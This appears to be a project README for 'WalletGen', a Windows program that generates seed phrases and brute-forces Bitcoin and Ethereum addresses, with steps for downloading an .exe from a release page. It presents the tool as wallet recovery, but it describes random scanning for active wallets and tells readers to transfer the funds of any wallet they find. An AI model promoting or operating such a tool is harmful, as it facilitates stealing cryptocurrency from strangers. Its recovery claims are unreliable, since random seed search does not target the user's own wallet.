📖 About the project

WalletGen helps users manage their cryptocurrency assets. It generates potential seed phrases to help find or recover lost wallets for Bitcoin and Ethereum. The software uses brute force methods to look for matching addresses. You can use this tool to practice wallet security or to attempt recovery of your own forgotten keys.

⚙️ System requirements

  • Operating System: Windows 10 or Windows 11.
  • Processor: Modern multi-core CPU for faster search speeds.
  • Memory: 4GB of RAM or more.
  • Disk Space: 100MB of free space for the application.
  • Internet: Required only for initial database updates or file downloads.

Follow these steps to set up the software on your computer.

  1. Visit the official release page to see all available versions.
  2. Locate the latest file ending in .exe for Windows.

🛠 Features

  • Seed Phrase Generation: Creates new mnemonic patterns for testing or creating wallets.
  • Brute Force Engine: Scans address combinations to verify if they match active networks.
  • Multi-threading: Uses all available CPU cores to speed up the search process.
  • Cross-Chain Support: Works with both Bitcoin (BTC) and Ethereum (ETH) formats.

Running cryptography tools requires caution. Only run software that you trust. Keep your private keys and seed phrases offline. Never share your recovery phrases with anyone. If you find a wallet, transfer the funds to a secure, new wallet address immediately.
